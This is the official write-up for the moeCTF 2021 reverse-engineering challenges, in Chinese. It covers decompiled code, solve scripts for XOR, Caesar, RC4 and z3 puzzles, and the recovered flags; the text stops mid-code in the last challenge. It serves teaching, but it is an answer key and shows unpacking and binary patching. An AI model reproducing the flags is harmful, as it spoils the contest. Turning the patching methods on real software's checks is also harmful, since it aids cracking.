#  moeCTF 2021 Official Write Ups

 _moeCTF 2021 出题组_ 

## RE

### EinfachRe

**主要考察对*ida*的简单使用和C语言的基础理解以及简单异或加密**

#### 解题思路

将程序拖进*ida*（不是*ida64*）中，定位到main函数按F5查看伪代码

```C
int main()
{
  int result; // eax
  char Destination[7]; // [esp+16h] [ebp-1Ah] BYREF
  char v[14]; // [esp+1Dh] [ebp-13h] BYREF
  char v3; // [esp+2Bh] [ebp-5h]
  int i; // [esp+2Ch] [ebp-4h]

  __main();
  strcpy(Destination, enflag);
  puts("Give me your flag:");
  gets(v);
  if ( check(v) )
  {
    for ( i = 0; i <= 6; ++i )
    {
      v3 = v[i] ^ v[i + 7];
      if ( v3 != Destination[i] )
      {
        puts("try again!!!");
        puts("your flag is moectf{******}");
        system("pause");
        return 0;
      }
    }
    printf("Congratulations!!!!!!!!!!!!!");
    system("pause");
    result = 0;
  }
  else
  {
    puts("wrong length!!");
    system("pause");
    result = 0;
  }
  return result;
}
```

逻辑很清晰，将输入的后七位与前七位进行异或，最后的到的结果和enflag进行比较

由于已知本次比赛flag格式为moectf{XXXXXXXXXXXXXXX}，所以前七位固定为 'moectf{'

可以用python或者c编写解题脚本

###解题脚本

```python
s= 'moectf{'
c= '(\x15:\x1bD\x14\x06'
print(s,end='')
for a,b in zip(s,c):
	print(chr(ord(a)^ord(b)),end='')
    
#moectf{Ez_x0r}
```

### realezpy

**python逆向的简单考察，*uncompy6*工具的使用**

#### 解题思路

文件为pyc格式，所以首先尝试使用*uncompy6*查看其python源码

```bash
uncompyle6.exe .\Ezpython.pyc
```

源码如下

```python
# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.7 (tags/v3.8.7:6503f05, Dec 21 2020, 17:59:51) [MSC v.1928 64 bit (AMD64)]
# Embedded file name: Ezpython.py
# Compiled at: 2021-07-28 10:01:40
# Size of source mod 2**32: 931 bytes
import time
c = [119, 121, 111, 109, 100, 112, 123, 74, 105, 100, 114, 48, 120, 95, 49, 99, 95, 99, 121, 48, 121, 48, 121, 48, 121, 48, 95, 111, 107, 99, 105, 125]


def encrypt(a):
    result = []
    for i in range(len(a)):
        if ord('a') <= ord(a[i]) <= ord('z'):
            result.append((ord(a[i]) + 114 - ord('a')) % 26 + ord('a'))
        elif ord('A') <= ord(a[i]) <= ord('Z'):
            result.append((ord(a[i]) + 514 - ord('A')) % 26 + ord('A'))
        else:
            result.append(ord(a[i]))
    else:
        return result


ipt = input('Plz give me your flag:')
out = encrypt(ipt)
if len(ipt) != len(c):
    print('Wrong lenth~')
    exit()
else:
    for i in range(len(c)):
        if out[i] != c[i]:
            print('Plz try again?')
            exit()
        else:
            print('Congratulations!!!')
            time.sleep(1)
            print('enjoy the beauty of python ~~~ ')
            import this
# okay decompiling .\Ezpython.pyc
```

通过分析源码可知是一个类似凯撒加密的加密函数，将输入加密后与c进行比较

#### 解题脚本

```python
c = [119, 121, 111, 109, 100, 112, 123, 74, 105, 100, 114, 48, 120, 95, 49, 99, 95, 99, 121, 48, 121, 48, 121, 48, 121, 48, 95, 111, 107, 99, 105, 125]

def de(a):
    if ord('a') <= a <= ord('z'):
        t = ((a + 114 - ord('a')) % 26 + ord('a'))
    elif ord('A') <= a <= ord('Z'):
        t = ((a + 514 - ord('A')) % 26 + ord('A'))
    else:
        t=a
    return t

for i in c:
    for n in range(256):
        if de(n) == i:
            print(chr(n) , end='')
#moectf{Pyth0n_1s_so0o0o0o0_easy}
```

#### midpython

**python打包exe的逆向以及python字节码的应用**

#### 解题思路

使用*pyinstxtractor*对python打包的exe进行解包

```bash
python pyinstxtractor.py midpython.exe
```

得到解包后的文件夹*Midpython (1).exe_extracted*，在里面可以发现*struct*和*midpython*

两个文件，利用16进制编辑器（例如*010editor*）进行pyc文件头修复，得到*midpython.pyc*,由于这个题用的是*python3.9*而*uncompy6*支持的最高版本为*python3.8*，所以这里使用 *dis*和*marshal*这两个python模块查看字节码

```PYTHON
import dis,marshal
f=open("Midpython.pyc","rb").read()

code = marshal.loads(f[16:])

dis.dis(code)
```

得到的字节码

```
  1           0 BUILD_LIST               0
              2 LOAD_CONST               0 ((69, 70, 79, 72, 88, 75, 85, 127, 89, 85, 74, 19, 74, 122, 107, 103, 75, 77, 9, 73, 29, 28, 67))
              4 LIST_EXTEND              1
              6 STORE_NAME               0 (key)

  2           8 LOAD_CONST               1 (<code object <lambda> at 0x000001E1F62D05B0, file "Midpython.py", line 2>)
             10 LOAD_CONST               2 ('<lambda>')
             12 MAKE_FUNCTION            0
             14 STORE_NAME               1 (xxor)

  3          16 LOAD_CONST               3 (<code object <lambda> at 0x000001E1F62D7920, file "Midpython.py", line 3>)
             18 LOAD_CONST               2 ('<lambda>')
             20 MAKE_FUNCTION            0
             22 STORE_NAME               2 (xoor)

  4          24 LOAD_CONST               4 (<code object <lambda> at 0x000001E1F62D79D0, file "Midpython.py", line 4>)
             26 LOAD_CONST               2 ('<lambda>')
             28 MAKE_FUNCTION            0
             30 STORE_NAME               3 (xorr)

  5          32 LOAD_NAME                4 (len)
             34 LOAD_NAME                0 (key)
             36 CALL_FUNCTION            1
             38 STORE_NAME               5 (length)

  6          40 LOAD_NAME                6 (input)
             42 LOAD_CONST               5 ('>>>input your flag:\n>>>')
             44 CALL_FUNCTION            1
             46 STORE_NAME               7 (ipt)

  7          48 LOAD_CONST               6 (1)
             50 STORE_NAME               8 (flag)

  8          52 LOAD_NAME                4 (len)
             54 LOAD_NAME                7 (ipt)
             56 CALL_FUNCTION            1
             58 LOAD_NAME                5 (length)
             60 COMPARE_OP               2 (==)
             62 POP_JUMP_IF_FALSE      114

  9          64 LOAD_NAME                9 (range)
             66 LOAD_NAME                5 (length)
             68 CALL_FUNCTION            1
             70 GET_ITER
        >>   72 FOR_ITER                38 (to 112)
             74 STORE_NAME              10 (i)

 10          76 LOAD_NAME                3 (xorr)
             78 LOAD_NAME               11 (ord)
             80 LOAD_NAME                7 (ipt)
             82 LOAD_NAME               10 (i)
             84 BINARY_SUBSCR
             86 CALL_FUNCTION            1
             88 LOAD_NAME               10 (i)
             90 CALL_FUNCTION            2
             92 LOAD_NAME                0 (key)
             94 LOAD_NAME               10 (i)
             96 BINARY_SUBSCR
             98 COMPARE_OP               3 (!=)
            100 POP_JUMP_IF_FALSE       72

 11         102 LOAD_CONST               7 (0)
            104 STORE_NAME               8 (flag)

 12         106 POP_TOP
            108 JUMP_ABSOLUTE          118
            110 JUMP_ABSOLUTE           72
        >>  112 JUMP_FORWARD             4 (to 118)

 14     >>  114 LOAD_CONST               7 (0)
            116 STORE_NAME               8 (flag)

 15     >>  118 LOAD_NAME                8 (flag)
            120 LOAD_CONST               6 (1)
            122 COMPARE_OP               2 (==)
            124 POP_JUMP_IF_FALSE      136

 16         126 LOAD_NAME               12 (print)
            128 LOAD_CONST               8 ('>>>Right!!')
            130 CALL_FUNCTION            1
            132 POP_TOP
            134 JUMP_FORWARD             8 (to 144)

 18     >>  136 LOAD_NAME               12 (print)
            138 LOAD_CONST               9 ('>>>Wrong!!')
            140 CALL_FUNCTION            1
            142 POP_TOP
        >>  144 LOAD_CONST              10 (None)
            146 RETURN_VALUE

Disassembly of <code object <lambda> at 0x000001E1F62D05B0, file "Midpython.py", line 2>:
  2           0 LOAD_FAST                0 (x)
              2 LOAD_FAST                1 (y)
              4 BINARY_XOR
              6 LOAD_CONST               1 (11)
              8 BINARY_XOR
             10 RETURN_VALUE

Disassembly of <code object <lambda> at 0x000001E1F62D7920, file "Midpython.py", line 3>:
  3           0 LOAD_GLOBAL              0 (xxor)
              2 LOAD_FAST                0 (x)
              4 LOAD_FAST                1 (y)
              6 CALL_FUNCTION            2
              8 LOAD_CONST               1 (45)
             10 BINARY_XOR
             12 RETURN_VALUE

Disassembly of <code object <lambda> at 0x000001E1F62D79D0, file "Midpython.py", line 4>:
  4           0 LOAD_GLOBAL              0 (xoor)
              2 LOAD_FAST                0 (x)
              4 LOAD_FAST                1 (y)
              6 CALL_FUNCTION            2
              8 LOAD_CONST               1 (14)
             10 BINARY_XOR
             12 RETURN_VALUE
```

依靠[官方文档]([dis --- Python 字节码反汇编器 — Python 3.9.6 文档](https://docs.python.org/zh-cn/3/library/dis.html))对源码进行复原

可大概复原出以下源码

```python
key = [69, 70, 79, 72, 88, 75, 85, 127, 89, 85, 74, 19, 74, 122, 107, 103, 75, 77, 9, 73, 29, 28, 67]
xxor = lambda x, y: (x ^ y) ^ 11
xoor = lambda x, y: xxor(x, y) ^ 45
xorr = lambda x, y: xoor(x, y) ^ 14
length = len(key)
ipt = input(">>>input your flag:\n>>>")
flag = 1
if len(ipt) == length:
    for i in range(length):
        if xorr(ord(ipt[i]), i) != key[i]:
            flag = 0
            break
else:
    flag = 0
if flag == 1:
    print(">>>Right!!")
else:
    print(">>>Wrong!!")
```

可知加密过程为异或加密，所以只要再异或一遍即可得到*flag*

#### 解题脚本

```python
key = [69, 70, 79, 72, 88, 75, 85, 127, 89, 85, 74, 19, 74, 122, 107, 103, 75, 77, 9, 73, 29, 28, 67]
xxor = lambda x, y: (x ^ y) ^ 11
xoor = lambda x, y: xxor(x, y) ^ 45
xorr = lambda x, y: xoor(x, y) ^ 14

for i in range(len(key)):
    print(chr(xorr((key[i]), i)), end='')
#moectf{Pyth0n_M@st3r!!}
```

### time2go

**初见*golang*以及*ida*中的*keypatch*插件使用**

#### 解题思路

拖入ida64，定位main函数

```c++
void __cdecl main_main()
{
  int v0; // edi
  int v1; // esi
  __int64 v2; // r8
  __int64 v3; // r9
  __int64 v4; // r8
  __int64 v5; // r9
  int v6; // edx
  int v7; // ecx
  __int64 v8; // r8
  __int64 v9; // r9
  __int64 v10; // r8
  __int64 v11; // r9
  int v12; // ecx
  __int64 i; // rbx
  int v14; // edx
  int v15; // er8
  __int64 v16; // r9
  int v17; // er8
  __int64 v18; // r9
  int v19; // er8
  __int64 v20; // r9
  int v21; // er8
  __int64 v22; // r9
  int v23; // edx
  int v24; // ecx
  int v25; // er8
  __int64 v26; // r9
  __int64 v27; // r8
  __int64 v28; // r9
  int v29; // edx
  int v30; // er8
  __int64 v31; // r9
  __int64 v32; // r8
  __int64 v33; // r9
  __int64 v34; // r8
  __int64 v35; // r9
  int v36; // edx
  int v37; // ecx
  int v38; // er8
  __int64 v39; // r9
  int v40; // edx
  int v41; // ecx
  int v42; // er8
  __int64 v43; // r9
  __int64 v44; // r8
  __int64 v45; // r9
  __int64 v46; // r8
  __int64 v47; // r9
  __int64 v48; // r8
  __int64 v49; // r9
  __int64 v50; // rdx
  __int64 v51; // r8
  __int64 v52; // r9
  int v53; // edx
  int v54; // ecx
  int v55; // er8
  __int64 v56; // r9
  __int64 v57; // [rsp+0h] [rbp-140h]
  __int64 v58; // [rsp+0h] [rbp-140h]
  __int64 v59; // [rsp+8h] [rbp-138h]
  __int64 v60; // [rsp+8h] [rbp-138h]
  __int64 v61; // [rsp+8h] [rbp-138h]
  void **v62; // [rsp+10h] [rbp-130h]
  __int64 v63; // [rsp+18h] [rbp-128h]
  __int64 v64; // [rsp+28h] [rbp-118h]
  __int64 v65; // [rsp+30h] [rbp-110h]
  __int64 v66; // [rsp+50h] [rbp-F0h]
  __int64 v67; // [rsp+58h] [rbp-E8h]
  __int128 v68; // [rsp+68h] [rbp-D8h] BYREF
  void *v69; // [rsp+78h] [rbp-C8h] BYREF
  void **v70; // [rsp+80h] [rbp-C0h] BYREF
  __int128 v71; // [rsp+88h] [rbp-B8h] BYREF
  __int128 v72; // [rsp+98h] [rbp-A8h]
  __int128 v73; // [rsp+A8h] [rbp-98h] BYREF
  __int128 v74; // [rsp+B8h] [rbp-88h] BYREF
  __int128 v75; // [rsp+C8h] [rbp-78h] BYREF
  __int128 v76; // [rsp+D8h] [rbp-68h] BYREF
  __int128 v77; // [rsp+E8h] [rbp-58h] BYREF
  __int128 v78; // [rsp+F8h] [rbp-48h]
  __int128 v79; // [rsp+108h] [rbp-38h] BYREF
  __int128 v80; // [rsp+118h] [rbp-28h] BYREF
  __int128 v81; // [rsp+128h] [rbp-18h]

  if ( (unsigned __int64)&v70 <= *(_QWORD *)(*(_QWORD *)NtCurrentTeb()->NtTib.ArbitraryUserPointer + 16LL) )
    runtime_morestack_noctxt();
  *(_QWORD *)&v71 = &unk_4B55A0;
  *((_QWORD *)&v71 + 1) = &off_4F2580;
  fmt_Fprintln(
    v0,
    v1,
    (__int64)&go_itab__os_File_io_Writer,
    (__int64)&v71,
    v2,
    v3,
    (__int64)&go_itab__os_File_io_Writer);
  v69 = &unk_4B55A0;
  v70 = &off_4F2590;
  v59 = os_Stdout;
  v62 = &v69;
  fmt_Fprintln(
    v0,
    v1,
    (__int64)&go_itab__os_File_io_Writer,
    (__int64)&v69,
    v4,
    v5,
    (__int64)&go_itab__os_File_io_Writer);
  time_Now(v0, v1, v6, v7, v8, v9, v57);
  v67 = v58;
  v12 = v59;
  v66 = v59;
  for ( i = 0LL; i < 20; ++i )
  {
    main_fun2(v0, v1, (unsigned int)&v69, v12, v10, v11, i, v59);
    runtime_convTstring(v0, v1, v14, (_DWORD)v62, v15, v16, v60, (__int64)v62);
    *(_QWORD *)&v68 = &unk_4B55A0;
    *((_QWORD *)&v68 + 1) = v62;
    fmt_Fprint(
      v0,
      v1,
      (unsigned int)&go_itab__os_File_io_Writer,
      (unsigned int)&unk_4B55A0,
      v17,
      v18,
      (__int64)&go_itab__os_File_io_Writer,
      os_Stdout,
      (__int64)&v68,
      1LL,
      1LL,
      v64,
      v65);
    time_Sleep(v0, v1, 4 * i % 15, i, v19, v20);
    time_Since(v0, v1, (unsigned int)&v69, v66, v21, v22, v67, v66, (__int64)&v69);
    if ( (double)(int)(v63 / 1000000000) + (double)(v63 % 1000000000) / 1000000000.0 > 55.0 )
    {
      *(_QWORD *)&v79 = &unk_4B55A0;
      *((_QWORD *)&v79 + 1) = &off_4F25A0;
      v61 = os_Stdout;
      fmt_Fprintln(v0, v1, (__int64)&v79, (__int64)&off_4F25A0, v10, v11, (__int64)&go_itab__os_File_io_Writer);
      runtime_convT64(v0, v1, v23, v24, v25, v26, v63);
      *(_QWORD *)&v80 = &unk_4C45E0;
      *((_QWORD *)&v80 + 1) = v61;
      *(_QWORD *)&v81 = &unk_4B55A0;
      *((_QWORD *)&v81 + 1) = &off_4F25B0;
      fmt_Fprintln(
        v0,
        (unsigned int)&go_itab__os_File_io_Writer,
        (__int64)&off_4F25B0,
        (__int64)&unk_4C45E0,
        v27,
        v28,
        (__int64)&go_itab__os_File_io_Writer);
      runtime_convTstring(
        v0,
        (unsigned int)&go_itab__os_File_io_Writer,
        v29,
        qword_565D58,
        v30,
        v31,
        (__int64)main_wrong,
        qword_565D58);
      *(_QWORD *)&v78 = &unk_4B55A0;
      *((_QWORD *)&v78 + 1) = &v80;
      fmt_Fprintln(
        v0,
        (unsigned int)&go_itab__os_File_io_Writer,
        (__int64)&go_itab__os_File_io_Writer,
        (__int64)&unk_4B55A0,
        v32,
        v33,
        (__int64)&go_itab__os_File_io_Writer);
      *(_QWORD *)&v77 = &unk_4B55A0;
      *((_QWORD *)&v77 + 1) = &off_4F25C0;
      v59 = os_Stdout;
      v62 = (void **)&v77;
      fmt_Fprintln(
        v0,
        (unsigned int)&go_itab__os_File_io_Writer,
        (__int64)&v77,
        (__int64)&off_4F25C0,
        v34,
        v35,
        (__int64)&go_itab__os_File_io_Writer);
      time_Sleep(v0, (unsigned int)&go_itab__os_File_io_Writer, v36, v37, v38, v39);
      os_Exit(v0, (unsigned int)&go_itab__os_File_io_Writer, v40, v41, v42, v43);
    }
    v1 = i;
    v12 = v66;
  }
  *(_QWORD *)&v76 = &unk_4B55A0;
  *((_QWORD *)&v76 + 1) = &off_4F25A0;
  fmt_Fprintln(
    v0,
    v1,
    (__int64)&go_itab__os_File_io_Writer,
    (__int64)&v76,
    v10,
    v11,
    (__int64)&go_itab__os_File_io_Writer);
  *(_QWORD *)&v75 = &unk_4B55A0;
  *((_QWORD *)&v75 + 1) = &off_4F25D0;
  fmt_Fprintln(
    v0,
    v1,
    (__int64)&go_itab__os_File_io_Writer,
    (__int64)&v75,
    v44,
    v45,
    (__int64)&go_itab__os_File_io_Writer);
  *(_QWORD *)&v74 = &unk_4B55A0;
  *((_QWORD *)&v74 + 1) = &off_4F2560;
  fmt_Fprintln(
    v0,
    v1,
    (__int64)&go_itab__os_File_io_Writer,
    (__int64)&v74,
    v46,
    v47,
    (__int64)&go_itab__os_File_io_Writer);
  *(_QWORD *)&v73 = &unk_4B55A0;
  *((_QWORD *)&v73 + 1) = &off_4F2570;
  fmt_Fprintln(
    v0,
    v1,
    (__int64)&go_itab__os_File_io_Writer,
    (__int64)&v73,
    v48,
    v49,
    (__int64)&go_itab__os_File_io_Writer);
  *(_QWORD *)&v72 = &unk_4B55A0;
  *((_QWORD *)&v72 + 1) = &off_4F25C0;
  fmt_Fprintln(v0, v1, v50, (__int64)&go_itab__os_File_io_Writer, v51, v52, (__int64)&go_itab__os_File_io_Writer);
  time_Sleep(v0, v1, v53, v54, v55, v56);
}
```

使用*keypatch*来nop掉每次循环中的*time_sleep*函数，更改程序过后

运行程序

```
welcome to moectf2021!
↓↓↓↓Here's your flag↓↓↓↓
moectf{G0_1an8uag3_1
++++++++++++++++++++++++++++++++++
Congratulations!!!!
You are very close to success!!
Try to find the remaining flags!!
++++++++++++++++++++++++++++++++++
```

发现flag只有一部分，回到ida中，发现还有两个自定义函数，在*main_fun1*中，发现可疑变量*Canufindme*，跟入按a键转化为字符串，可得剩余flag：*5_amaz1ng}*

flag：*moectf{G0_1an8uag3_15_amaz1ng}*

### clothes

#### 考点

-   壳的识别与检测

-   简单异或

#### 解题

>   由于使用了最新的`aspack`壳，预期解是希望选手尝试手动脱一下壳，但是经过调查，网上也有现成的脱壳机能用

用OD载入使用ESP定律脱壳，脱壳之后通过字符串找main函数

是一个简单的异或加密：

```python
XOR = lambda s1, s2 : bytes([x1 ^ x2 for x1, x2 in zip(s1, s2)])
s1 = [0x73, 0x45, 0x2b, 0x47, 0x57, 0x69, 0x53, 0xd, 0x44, 0x4c, 0x2e, 0x2f, 0x5, 0x6a, 0x13, 0x4d, 0x57, 0x31, 0x4b, 0x22, 0x58, 0x6, 0x49, 0x71, 0x4c, 0x6a, 0x32, 0x64, 0x18, 0x45, 0x00]
s2 = [0x1e, 0x2a, 0x4e, 0x24, 0x23, 0xf, 0x28, 0x39, 0x71, 0x3c, 0x4f, 0x4c, 0x6e, 0x35, 0x22, 0x3e, 0x8, 0x2, 0x31, 0x7d, 0x2c, 0x36, 0x16, 0x4, 0x22, 0x1a, 0x53, 0x7, 0x73, 0x38, 0x00]
print(XOR(s1, s2))
```

### PEPEPE

#### 考点

-   PE结构中DOS头与NT头的关联
-   DOS头中的签名一般不变

#### 解题

用十六进制编辑器，在0X3C的位置按小端序补上0x80，发现可以运行了，拖进32位IDA，发现符号表是全的，利用DOS头中的签名，尝试得到加密`file_org`的密钥：

```python
sig = b'This program cannot be run in DOS mode'
mess = [222, 182, 228, 233, 169, 234, 255, 249, 253, 255, 233, 251, 179, 240, 242, 248,
250, 245, 242, 176, 232, 187, 173, 232, 252, 244, 173, 255, 244, 173, 204, 217,
192, 179, 254, 249, 240, 255]

for i in range(len(sig)):
    print(chr(sig[i]^mess[i]^0xff), end="")

# u!reverierwilllikeyou!reverierwilllike
```

容易得到密钥为`reverierwilllikeyou!`

然后利用这个密钥去还原`file`就行了，脚本就和上面得到密钥的脚本差不多：

```python
enc_data = open('./file', 'rb').read()
origin_file = open('./origin.exe', 'wb')
key = b'reverierwilllikeyou!'

origin_data = bytes([(enc_data[i] ^ 0xff)^key[i % len(key)] for i in range(len(enc_data))])
origin_file.write(origin_data)
```

### RedC4Bomb 

#### 考点

-   花指令
-   简单的RC4流密码

#### 解题

简单的花指令去除，发现一些常见的花指令以及空函数，都比较好去。然后加密用的是一个改过的RC4：

```cpp
#include <cstdio>
#include <cstring>
using namespace std;

// flag: D1S4ss3mbl3_th3_b0mb
unsigned char cipher[] = {68,63,83,47,115,134,62,174,85,190,24,95,116,104,51,95,242,6,109,98};
unsigned char S[256];
const char* key = "THISISAFAKEFLAG";

int my_strlen (unsigned char *a) {
	int len = 0;
	while (*a++ != '\0') {
		len ++;
	}
	return len;
}

void swap(unsigned char* a1, unsigned char* a2) {
	unsigned char tmp = *a1;
	*a1 = *a2;
	*a2 = tmp; // -1
}

void KSA(const char* key, unsigned char* S) {
	int key_len = strlen(key);
	int j = 0;
	for (int i = 0; i < 256; i++) {
		S[i] = 255 - i;
		j = (j + S[i] + key[i % key_len]) % 256;
		swap(&S[i], &S[j]);
	}
}

void PRGA(unsigned char* S, unsigned char* cipher) {
	int i = 0, j = 0;
	int cipher_len = my_strlen(cipher);
	for (int k = 0; k < cipher_len; k++) {
		i = (i + 1) % 256;
		j = (j + S[i]) % 256;
		swap(&S[i], &S[j]);
		cipher[k] ^= S[(S[i] + S[j])%256];
	}
}

int main() {
    KSA(key, S);
    PRGA(S, cipher);
    // for (int i = 0; i < 20; i++) {
    //     printf("%d\n", cipher[i]);
    // }
    printf("%s", cipher);
    return 0;
}
```

### welcome_to_the_world_of_re

本体非常简单，共有两种做法

#### 解法一

直接shift+f12查看字符串，直接就能找到flag

![](https://i.loli.net/2021/09/22/FEQSP96aAguwzkM.png)

#### 解法二

一步一步查看函数列表，发现最后一个函数指针是验证字符串相等，就能直接找到flag

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+2Ch] [rbp-4h]

  sub_401800(argc, argv, envp);
  puts("<---  moectf2021  --->");
  puts(" [CheckIn] Welcome to moectf2021.");
  puts("This is a really eazy chall. I believe it is easy for you to get the flag");
  puts("Now input your flag and I will check it : ");
  scanf("%100s", &unk_407040);
  for ( i = 0; i <= 3; ++i )
    ((void (__fastcall *)(void *))funcs_4016DE[i])(&unk_407040);
  if ( byte_403020 )
  {
    puts("Congratulations!!!");
    puts("See you next chall!!!");
  }
  else
  {
    puts("Something went wrong!   QwQ");
    puts("Try againt!!!");
  }
  puts("按任意键以继续");
  getchar();
  getchar();
  return 0;
}
```

双击`funcs_4016DE`可以跟进

```
.data:0000000000403040 funcs_4016DE    dq offset sub_401550    ; DATA XREF: main+66↑o
.data:0000000000403040                                         ; main+6D↑r
.data:0000000000403040                 dq offset sub_401585
.data:0000000000403040                 dq offset sub_4015C5
.data:0000000000403040                 dq offset sub_401606
```

`funcs_4016DE`是函数列表，里面有四个函数指针，前三个分别验证flag的长度、头、尾，最后一个验证flag的内容，同样可以得到flag

`moectf{W31C0Me_t0_m03CTF_2021_w0o0o0oooo0ooooo0o0oooo0!!!}`

### A_game

数独题

```
check1();	行验证
check2();	列验证
check3();	对角线验证
```

数独如下

```
0 0 5 0 0 4 3 6 0 
0 0 0 0 5 0 0 2 4 
0 4 9 6 7 0 0 0 0 
1 0 6 0 2 0 0 3 0 
9 0 0 7 0 0 1 0 8 
0 3 0 0 0 5 0 9 0 
2 0 0 5 0 7 0 0 9 
7 0 4 0 0 0 8 0 0 
0 9 0 0 4 0 0 0 6 
```

选择手动解数独，或者去在线网站自动解数独，或者自己写脚本解数独

得到raw input : 8291767138932581849755263447186268341129653538127

输入到程序中得到flag

`moectf{S0_As_I_prAy_Un1imited_B1ade_WOrks---E1m1ya_Shiro}`

### 大佬请喝coffee

java逆向，用jadx或者jd-gui都可以看到源代码

本质上就是解一个方程组

![](https://i.loli.net/2021/09/22/aLW4jTGvpS12xed.png)

写出exp

```python
from z3 import *
bufArray = [Int("buf{}".format(i)) for i in range(9)]
s = Solver()
s.add(bufArray[0]*4778+bufArray[1]*3659+bufArray[2]*9011+bufArray[3]*5734+bufArray[4]*4076+bufArray[5]*6812+bufArray[6]*8341+bufArray[7]*6765+bufArray[8]*7435==5711942)
s.add(bufArray[0]*4449+bufArray[1]*5454+bufArray[2]*4459+bufArray[3]*5800+bufArray[4]*6685+bufArray[5]*6120+bufArray[6]*7357+bufArray[7]*3561+bufArray[8]*5199==4885863)
s.add(bufArray[0]*3188+bufArray[1]*6278+bufArray[2]*9411+bufArray[3]*5760+bufArray[4]*9909+bufArray[5]*7618+bufArray[6]*7184+bufArray[7]*4791+bufArray[8]*8686==6387690)
s.add(bufArray[0]*8827+bufArray[1]*7419+bufArray[2]*7033+bufArray[3]*9306+bufArray[4]*7300+bufArray[5]*5774+bufArray[6]*6588+bufArray[7]*5541+bufArray[8]*4628==6077067)
s.add(bufArray[0]*5707+bufArray[1]*5793+bufArray[2]*4589+bufArray[3]*6679+bufArray[4]*3972+bufArray[5]*5876+bufArray[6]*6668+bufArray[7]*5951+bufArray[8]*9569==5492294)
s.add(bufArray[0]*9685+bufArray[1]*7370+bufArray[2]*4648+bufArray[3]*7230+bufArray[4]*9614+bufArray[5]*9979+bufArray[6]*8309+bufArray[7]*9631+bufArray[8]*9272==7562511)
s.add(bufArray[0]*6955+bufArray[1]*8567+bufArray[2]*7949+bufArray[3]*8699+bufArray[4]*3284+bufArray[5]*6647+bufArray[6]*3175+bufArray[7]*8506+bufArray[8]*6552==5970432)
s.add(bufArray[0]*4323+bufArray[1]*4706+bufArray[2]*8081+bufArray[3]*7900+bufArray[4]*4862+bufArray[5]*9544+bufArray[6]*5211+bufArray[7]*7443+bufArray[8]*5676==5834523)
s.add(bufArray[0]*3022+bufArray[1]*8999+bufArray[2]*5058+bufArray[3]*4529+bufArray[4]*3940+bufArray[5]*4279+bufArray[6]*4606+bufArray[7]*3428+bufArray[8]*8889==4681110)
print(s.check())
print(s.model())
```

flag

`moectf{moectf{EXcalibur}}`

### baby_bc

题目附件是llvm ir code，直接阅读比较困难，所以先编译成可执行程序，这里在ubuntu编译

```bash
$ llvm-as chall.ll
$ llc chall.bc
$ clang chall.s
```

可以得到a.out，能直接拖进ida，定位到关键代码

```c
  if ( strlen(input) != 40 )
  {
    puts("Wrong length!");
    exit(0);
  }
  v10 = strlen(dest);
  func_114514(s, dest, v10);
  v11 = strlen(input);
  func_1919810(s, input, v11);
  v12 = strlen(input);
  HSencode(input, v12, v7);
  for ( i = 0; ; ++i )
  {
    v3 = i;
    if ( v3 >= strlen(v7) )
      break;
    if ( v7[i] != bytes_114514[i] )
    {
      printf("rua! you are wrong!");
      exit(0);
    }
  }
```

 func_114514和 func_1919810共同构成RC4加密

HSencode其实是一个类似base的加密，分析其加密逻辑之后发现是将输入的三个字符转换成四个字符

首先将断点打在RC4加密之后，获取RC4加密的结果，我输入的flag为40个A，得到的加密结果是exp中的table，table再异或ord('A')就能得到RC4加密过程中与明文异或的密钥。

```python
table=[0x20,0x77,0xDF,0x77,0x4C,0x72,0x2C,0x43,0x3D,0x52,0x86,0xD9,0x0C,0xBC,0x1E,0x9B,0x88,0x72,0xE9,0x45,0xA1,0x1D,0x6D,0x3B,0xB2,0xD2,0xD9,0xAE,0xA4,0x15,0x2E,0x16,0x1B,0x73,0x94,0xEB,0x11,0x84,0x4C,0xCE]
for i in range(len(table)):
    table[i] ^= ord('A')
en_flag="@BdxRTbRBbjIVf`PEyqe^\^\|cc|JRubaGLytHeRI@jgNegHU[Myy]=="
tmp = []
dest = [0]*100
flag=""
for i in en_flag:
    tmp.append(ord(i)-61)
for i in range(len(tmp)//4):
    dest[i*3] = (tmp[i*4]<<2) | (tmp[i*4+1]>>4)
    dest[i*3 + 1] = ((tmp[i*4+1]&0b1111)<<4) | (tmp[i*4+2]>>2)
    dest[i*3 + 2] = ((tmp[i*4+2]&0b11) << 6) | (tmp[i*4+3])
for i in range(40):
    flag+=chr((dest[i])^table[i])
print(flag)
```

得到flag

`moectf{Y0u_Kn0w_1lVm_ir_c0d3_A_l0t_!1!1}`

### ez_Algorithm

题目很简单，就是等就给flag……但是为了防止你们真的这么做，flag我设置70多位（嘻嘻

咳咳，总而言之就是一个数列的递推式用递归（无优化）来算会炸时间、空间

所以这里做一个算法优化，递归转递推，exp:

```c++
#include<bits/stdc++.h>
using namespace std;
int flag[77] = {109, 110, 96, 200, 21793, 11184845, 1431655726, -1431655777, 1431655731, -1431655780, 1431655782, -1431655719, 1431655690, -1431655734, 1431655780, -1431655782, 1431655690, -1431655780, 1431655741, -1431655782, 1431655718, -1431655692, 1431655778, -1431655782, 1431655736, -1431655784, 1431655723, -1431655697, 1431655781, -1431655692, 1431655724, -1431655781, 1431655712, -1431655692, 1431655719, -1431655784, 1431655732, -1431655782, 1431655780, -1431655727, 1431655782, -1431655692, 1431655778, -1431655741, 1431655782, -1431655692, 1431655736, -1431655784, 1431655732, -1431655739, 1431655780, -1431655739, 1431655730, -1431655692, 1431655781, -1431655731, 1431655690, -1431655681, 1431655780, -1431655738, 1431655782, -1431655692, 1431655734, -1431655781, 1431655736, -1431655717, 1431655780, -1431655784, 1431655725, -1431655782, 1431655778, -1431655726, 1431655786, -1431655788, 1431655786, -1431655722};
int main()
{
    int li[10000];
    memset(li,0,sizeof(li)); 
    li[0]=0;li[1]=1;
    for(int i=2;i<7000;i++)
        li[i]=2*li[i-2]+li[i-1];
    for(int i=0;i<76;i++){
        int tmp = flag[i] ^ li[i * i];
        printf("%c", tmp);
    }
}
// moectf{4f73r_a11_7h1s_71m3~D0_y0u_r3a11z3_7h3_m3an1ng_0f_T1m3_c0mp13x17y???}
```

### ez_Algorithm_revenge

算法难度不是很大，但是逆向和算法结合起来就比较有意思了。

源文件：

```c++
#include<bits/stdc++.h>
using namespace std;
int mapp[60][60];
void init(){
    cout<<"Welcome to moectf 2021!\nHearing that ez_Algorithm is toooooooo ez, here's it's revenge.\n";
    cout<<"Here's a maze.Try to get the maxium:\n";
}
void mkdata(){
    memset(mapp, 0, sizeof(mapp));
    int seed = 114514;
    srand(seed);
